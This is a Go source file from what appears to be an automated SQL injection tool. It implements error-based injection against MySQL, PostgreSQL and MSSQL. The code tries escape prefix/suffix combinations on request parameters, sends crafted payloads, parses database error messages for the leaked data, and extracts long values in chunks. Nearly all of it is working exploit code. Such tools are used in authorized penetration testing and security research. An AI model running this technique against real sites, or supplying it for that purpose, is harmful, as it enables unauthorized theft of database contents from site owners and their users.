// Package errorbased implements the error-based SQL injection technique.
//
// Error-based injection extracts data by forcing the database to include
// query results in error messages. This is the fastest technique because
// data is returned directly in a single HTTP response, unlike boolean-based
// (which requires bit-by-bit extraction) or time-based (which requires delays).
//
// Supported DBMS:
//   - MySQL: extractvalue() and updatexml() XPATH errors with 0x7e (~) delimiter
//   - PostgreSQL: CAST() type conversion errors
package errorbased

import (
	"context"
	"fmt"
	"net/url"
	"regexp"
	"strings"

	"github.com/0x6d61/sqleech/internal/dbms"
	"github.com/0x6d61/sqleech/internal/engine"
	"github.com/0x6d61/sqleech/internal/payload"
	"github.com/0x6d61/sqleech/internal/technique"
	"github.com/0x6d61/sqleech/internal/transport"
)

// mysqlChunkSize is the maximum characters MySQL extractvalue/updatexml can
// return in a single error message (32 chars minus 1 for the ~ prefix).
const mysqlChunkSize = 31

// maxChunks limits the number of SUBSTRING requests to prevent infinite loops.
const maxChunks = 50

// prefixSuffixPairs defines common SQL context escape combinations to try.
// Each pair is (prefix, suffix).
var prefixSuffixPairs = []struct {
	prefix string
	suffix string
}{
	{"", "-- "},
	{"'", "-- "},
	{"\"", "-- "},
	{")", "-- "},
	{"')", "-- "},
	{"", "#"},
	{"'", "#"},
}

// Regex patterns for extracting data from error messages.
var (
	// mysqlTildePattern matches MySQL XPATH error output: ~<DATA>~ or ~<DATA>'
	// The tilde (0x7e) is used as a delimiter in concat(0x7e, ...) payloads.
	mysqlTildePattern = regexp.MustCompile(`~([^~']+)`)

	// postgresqlCastPattern matches PostgreSQL CAST type error output:
	// invalid input syntax for type integer: "<DATA>"
	postgresqlCastPattern = regexp.MustCompile(`invalid input syntax for type integer: "([^"]+)"`)

	// mssqlConvertPattern matches MSSQL CONVERT/CAST type conversion error output:
	// Conversion failed when converting the varchar value '<DATA>' to data type int.
	mssqlConvertPattern = regexp.MustCompile(`(?i)Conversion failed when converting the (?:n?varchar|nchar|char|ntext|text) value '([^']+)' to data type`)
)

// ErrorBased implements the error-based SQL injection technique.
type ErrorBased struct{}

// New creates a new ErrorBased technique instance.
func New() *ErrorBased {
	return &ErrorBased{}
}

// Name returns the technique name.
func (e *ErrorBased) Name() string {
	return "error-based"
}

// Priority returns 1 (highest priority), as error-based is the fastest technique.
func (e *ErrorBased) Priority() int {
	return 1
}

// Detect tests whether a parameter is vulnerable to error-based SQL injection.
//
// It works by:
// 1. Collecting error payload templates for the target DBMS (or all DBMS if unknown)
// 2. For each template, substituting the version query to create a test payload
// 3. Trying common prefix/suffix combinations to escape the SQL context
// 4. Sending the crafted payload and checking for extracted data in error messages
func (e *ErrorBased) Detect(ctx context.Context, req *technique.InjectionRequest) (*technique.DetectionResult, error) {
	templates := collectPayloadTemplates(req.DBMS)
	if len(templates) == 0 {
		return &technique.DetectionResult{Injectable: false}, nil
	}

	for _, tmpl := range templates {
		d := dbms.Registry(tmpl.DBMS)
		if d == nil {
			continue
		}

		// Use VersionQuery as the detection probe
		versionQuery := d.VersionQuery()
		rendered, err := renderTemplate(tmpl.Template, versionQuery)
		if err != nil {
			continue
		}

		for _, ps := range prefixSuffixPairs {
			fullPayload := req.Parameter.Value + ps.prefix + " AND " + rendered + ps.suffix

			probeReq := buildProbeRequest(req.Target, req.Parameter, fullPayload)
			resp, err := req.Client.Do(ctx, probeReq)
			if err != nil {
				continue
			}

			body := resp.BodyString()
			extracted := parseErrorResponse(body, tmpl.DBMS)
			if extracted != "" {
				p := payload.NewBuilder().
					WithPrefix(ps.prefix).
					WithCore(" AND " + rendered).
					WithSuffix(ps.suffix).
					WithTechnique("error-based").
					WithDBMS(tmpl.DBMS).
					Build()

				return &technique.DetectionResult{
					Injectable: true,
					Confidence: 0.95,
					Technique:  "error-based",
					Payload:    p,
					Evidence:   extracted,
				}, nil
			}
		}
	}

	return &technique.DetectionResult{Injectable: false}, nil
}

// Extract retrieves the value of a SQL expression using error-based injection.
//
// It handles MySQL's extractvalue/updatexml 32-character truncation by using
// SUBSTRING to extract data in chunks when needed.
func (e *ErrorBased) Extract(ctx context.Context, req *technique.ExtractionRequest) (*technique.ExtractionResult, error) {
	templates := collectPayloadTemplates(req.DBMS)
	if len(templates) == 0 {
		return nil, fmt.Errorf("no error payload templates for DBMS %q", req.DBMS)
	}

	for _, tmpl := range templates {
		d := dbms.Registry(tmpl.DBMS)
		if d == nil {
			continue
		}

		// First, try to extract the full value in a single request.
		rendered, err := renderTemplate(tmpl.Template, req.Query)
		if err != nil {
			continue
		}

		for _, ps := range prefixSuffixPairs {
			fullPayload := req.Parameter.Value + ps.prefix + " AND " + rendered + ps.suffix

			probeReq := buildProbeRequest(req.Target, req.Parameter, fullPayload)
			resp, err := req.Client.Do(ctx, probeReq)
			if err != nil {
				continue
			}

			body := resp.BodyString()
			extracted := parseErrorResponse(body, tmpl.DBMS)
			if extracted == "" {
				continue
			}

			// If the DBMS is MySQL and the data may be truncated (exactly
			// mysqlChunkSize chars), use SUBSTRING to retrieve in chunks.
			if tmpl.DBMS == "MySQL" && len(extracted) >= mysqlChunkSize {
				fullValue, totalRequests := extractChunked(ctx, req, tmpl, d, ps.prefix, ps.suffix)
				if fullValue != "" {
					return &technique.ExtractionResult{
						Value:    fullValue,
						Partial:  false,
						Requests: totalRequests,
					}, nil
				}
			}

			// Data fits in a single response (or non-MySQL)
			return &technique.ExtractionResult{
				Value:    extracted,
				Partial:  false,
				Requests: 1,
			}, nil
		}
	}

	return &technique.ExtractionResult{
		Value:   "",
		Partial: true,
	}, nil
}

// extractChunked extracts data in chunks using SUBSTRING for MySQL truncation handling.
func extractChunked(
	ctx context.Context,
	req *technique.ExtractionRequest,
	tmpl dbms.PayloadTemplate,
	d dbms.DBMS,
	prefix, suffix string,
) (string, int) {
	var result strings.Builder
	requests := 0

	for chunk := 0; chunk < maxChunks; chunk++ {
		start := chunk*mysqlChunkSize + 1
		substringQuery := d.Substring("("+req.Query+")", start, mysqlChunkSize)

		rendered, err := renderTemplate(tmpl.Template, substringQuery)
		if err != nil {
			break
		}

		fullPayload := req.Parameter.Value + prefix + " AND " + rendered + suffix
		probeReq := buildProbeRequest(req.Target, req.Parameter, fullPayload)
		resp, err := req.Client.Do(ctx, probeReq)
		requests++
		if err != nil {
			break
		}

		body := resp.BodyString()
		extracted := parseErrorResponse(body, tmpl.DBMS)
		if extracted == "" {
			break
		}

		result.WriteString(extracted)

		// If we got less than a full chunk, we have all the data.
		if len(extracted) < mysqlChunkSize {
			break
		}
	}

	return result.String(), requests
}

// parseErrorResponse extracts data from SQL error messages in the response body.
//
// For MySQL (extractvalue/updatexml): looks for data after the ~ (0x7e) delimiter
// in patterns like "XPATH syntax error: '~<DATA>~'" or "~<DATA>'"
//
// For PostgreSQL (CAST): looks for data in patterns like
// 'invalid input syntax for type integer: "<DATA>"'
//
// When dbmsName is empty, all patterns are tried.
func parseErrorResponse(body string, dbmsName string) string {
	if body == "" {
		return ""
	}

	tryMySQL := dbmsName == "" || dbmsName == "MySQL" || dbmsName == "mysql"
	tryPostgreSQL := dbmsName == "" || dbmsName == "PostgreSQL" || dbmsName == "postgresql" || dbmsName == "postgres"
	tryMSSQL := dbmsName == "" || dbmsName == "MSSQL" || dbmsName == "mssql" || dbmsName == "sqlserver"

	if tryMySQL {
		if matches := mysqlTildePattern.FindStringSubmatch(body); len(matches) > 1 {
			return matches[1]
		}
	}

	if tryPostgreSQL {
		if matches := postgresqlCastPattern.FindStringSubmatch(body); len(matches) > 1 {
			return matches[1]
		}
	}

	if tryMSSQL {
		if matches := mssqlConvertPattern.FindStringSubmatch(body); len(matches) > 1 {
			return matches[1]
		}
	}

	return ""
}

// collectPayloadTemplates returns error payload templates for the given DBMS.
// If dbmsName is empty, templates from all supported DBMS are returned.
func collectPayloadTemplates(dbmsName string) []dbms.PayloadTemplate {
	if dbmsName != "" {
		d := dbms.Registry(dbmsName)
		if d == nil {
			return nil
		}
		return d.ErrorPayloads()
	}

	// Unknown DBMS: collect from all supported databases.
	var templates []dbms.PayloadTemplate
	for _, name := range []string{"MySQL", "PostgreSQL", "MSSQL"} {
		d := dbms.Registry(name)
		if d != nil {
			templates = append(templates, d.ErrorPayloads()...)
		}
	}
	return templates
}

// templatePlaceholder is the Go template-style placeholder used in
// dbms.PayloadTemplate.Template strings.
const templatePlaceholder = "{{.Query}}"

// renderTemplate substitutes the {{.Query}} placeholder in a PayloadTemplate
// string with the given query expression using simple string replacement.
func renderTemplate(tmplStr string, query string) (string, error) {
	if !strings.Contains(tmplStr, templatePlaceholder) {
		return "", fmt.Errorf("template missing %s placeholder", templatePlaceholder)
	}
	return strings.Replace(tmplStr, templatePlaceholder, query, 1), nil
}

// buildProbeRequest creates a transport.Request with the target parameter
// replaced by the payload value. It handles both query string (GET) and
// body (POST) parameter locations.
func buildProbeRequest(target *engine.ScanTarget, param *engine.Parameter, payloadStr string) *transport.Request {
	req := &transport.Request{
		Method:      target.Method,
		URL:         target.URL,
		Body:        target.Body,
		ContentType: target.ContentType,
	}

	// Copy headers
	if target.Headers != nil {
		req.Headers = make(map[string]string, len(target.Headers))
		for k, v := range target.Headers {
			req.Headers[k] = v
		}
	}

	// Copy cookies
	if target.Cookies != nil {
		req.Cookies = make(map[string]string, len(target.Cookies))
		for k, v := range target.Cookies {
			req.Cookies[k] = v
		}
	}

	switch param.Location {
	case engine.LocationQuery:
		req.URL = modifyQueryParam(target.URL, param.Name, payloadStr)
	case engine.LocationBody:
		req.Body = modifyBodyParam(target.Body, param.Name, payloadStr)
	}

	return req
}

// modifyQueryParam replaces the value of a named query parameter in the URL.
func modifyQueryParam(rawURL, paramName, newValue string) string {
	parsed, err := url.Parse(rawURL)
	if err != nil {
		return rawURL
	}

	q := parsed.Query()
	q.Set(paramName, newValue)
	parsed.RawQuery = q.Encode()

	return parsed.String()
}

// modifyBodyParam replaces the value of a named parameter in a
// application/x-www-form-urlencoded body.
func modifyBodyParam(body, paramName, newValue string) string {
	values, err := url.ParseQuery(body)
	if err != nil {
		return body
	}

	values.Set(paramName, newValue)
	return values.Encode()
}
